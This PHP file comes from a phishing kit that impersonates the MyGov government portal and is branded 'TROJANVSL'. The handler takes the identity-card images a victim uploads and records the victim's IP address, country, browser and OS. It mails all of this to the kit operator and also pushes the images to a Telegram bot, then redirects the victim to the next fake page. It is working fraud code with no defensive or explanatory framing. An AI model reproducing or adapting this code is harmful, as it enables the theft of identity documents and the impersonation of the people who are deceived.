<?php
error_reporting(0);
session_start();
include("./ServerData.php");
include("../../edit.php");

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
   
	
    $realip = $_SERVER['REMOTE_ADDR'];
    $subject = " [Login Access] from : " . $realip . "\r\n";
   	$message .= "
	<h2 style='text-align: center;'><span style ='color : blue;'>TELEGRAM </span>: TROJAN<span style='color:red;'>VSL</span></h2>
	<h3 style='text-align: center'>MY GOV</h3><br>
	<h3 style='text-align: center'>IDENTITY CARD</h3><br>
	<ul>
		<li>Identity card is added as attachment for :</li><br>
		<li>" . $_SESSION['username'] . "</li><br>
		
	</ul>
	<br>
	<h3 style='text-align: center'>IP HOSTNAME DATA</h3><br>
	<ul>
		<li>Country: " . visitor_country() . "</li><br>
		<li>VICTIM DNS: " . $dns . "</li><br>
		<li>IP Address 1: " . $realip . "</li><br>
		<li>IP Address 2: " . $customip  . "</li><br>
		<li>Browser: " . $browser . "</li><br>
		<li>Device/OS: " . $OS . "</li><br>
	</ul>";

    $boundary = md5(time());
    $headers = "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: multipart/mixed; boundary=\"{$boundary}\"\r\n";
    $headers .= "From: MyGov <example@vslmail.com>\r\n";
    $headers .= "To: You <user@vslmail.com>\r\n";
    $body = "--{$boundary}\r\n";
    $body .= "Content-Type: text/html; charset=ISO-8859-1\r\n";
    $body .= "Content-Transfer-Encoding: 7bit\r\n\r\n";
    $body .= $message . "\r\n\r\n";

    
    $attachments = [];
    if (isset($_FILES['img1']) && $_FILES['img1']['error'] == UPLOAD_ERR_OK) {
        $body .= "--{$boundary}\r\n";
        $body .= encodeFile($_FILES['img1']['tmp_name'], $_FILES['img1']['name']);
        $attachments[] = $_FILES['img1'];
    }
    if (isset($_FILES['img2']) && $_FILES['img2']['error'] == UPLOAD_ERR_OK) {
        $body .= "--{$boundary}\r\n";
        $body .= encodeFile($_FILES['img2']['tmp_name'], $_FILES['img2']['name']);
        $attachments[] = $_FILES['img2'];
    }

    $body .= "--{$boundary}--";

   
	$uploadedImages = [];
	for ($i = 1; $i <= 2; $i++) {
		$fileInputName = "img{$i}";
		$uploadedImage = $_FILES[$fileInputName];
		$tempImagePath = $uploadedImage['tmp_name'];
		if (is_uploaded_file($tempImagePath)) {
			$uploadedImages[] = $tempImagePath;
		}
	}
    
 
    foreach ($uploadedImages as $tempImagePath) {
		$response = sendImageToBot($botToken, $chatID, $tempImagePath);   
        }
		
	

   

	 (mail($receiver, $subject, $body, $headers)) ?
        header("Location: ../../user/personal")
    	: header("Location: ../../user/idenfitication");
    
}




?>